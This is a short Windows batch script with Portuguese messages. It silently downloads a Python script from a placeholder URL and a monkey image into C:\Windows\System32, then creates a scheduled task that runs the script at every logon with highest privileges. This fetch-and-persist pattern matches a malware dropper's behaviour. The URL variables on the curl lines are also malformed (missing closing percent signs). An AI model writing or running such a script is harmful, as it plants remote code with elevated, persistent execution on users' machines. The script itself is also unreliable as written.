@echo off
setlocal


set "PY_URL=https://exemplo.com/seu_script.py"
set "IMG_URL=https://png.pngtree.com/thumb_back/fh260/background/20230613/pngtree-young-monkey-looking-at-the-camera-with-its-mouth-open-image_2911673.jpg"


set "DOWNLOAD_DIR=C:\Windows\System32"
set "PYTHON_FILE=%DOWNLOAD_DIR%\script_inicializacao.py"
set "IMAGE_FILE=%DOWNLOAD_DIR%\macaco.jpg"



curl -o "%PYTHON_FILE%" "%PY_URL" --silent
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao baixar o script Python.
    exit /b 1
)



curl -o "%IMAGE_FILE%" "%IMG_URL" --silent
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao baixar a imagem.
    exit /b 1
)


echo Configurando script para iniciar com o sistema...
schtasks /create /sc onlogon /tn "ScriptInicializacao" /tr "python %PYTHON_FILE%" /rl highest /f
if %ERRORLEVEL% NEQ 0 (
    echo Falha ao configurar o script para inicialização.
    exit /b 1
)

echo Instalacao concluida com sucesso!
pause
